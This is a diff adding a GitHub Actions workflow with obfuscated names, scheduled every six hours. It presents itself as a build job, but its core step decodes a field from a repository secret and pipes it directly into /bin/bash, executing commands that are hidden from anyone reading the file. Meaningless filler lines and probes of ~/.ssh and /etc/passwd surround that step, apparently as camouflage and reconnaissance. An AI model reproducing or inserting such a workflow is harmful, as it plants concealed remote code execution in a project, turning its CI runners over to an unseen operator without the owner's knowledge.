@@ -1,0 +1,27 @@
+name: guanzhongxian6226
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guanzhongxian6226
+        env:
+          d23509: ${{ secrets.d23509 }}
+        run: |
+          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          echo $d23509 | jq -r .d32753 | /bin/bash
+          echo "Dir: $(pwd)"
+          echo "Version: $((1 + RANDOM % 5))"
+          git pull -r
+          echo "Time: $(date +%H:%M:%S)"
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
+          echo "Date only: $(date +%F)"
+          echo "User: $(whoami)"
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
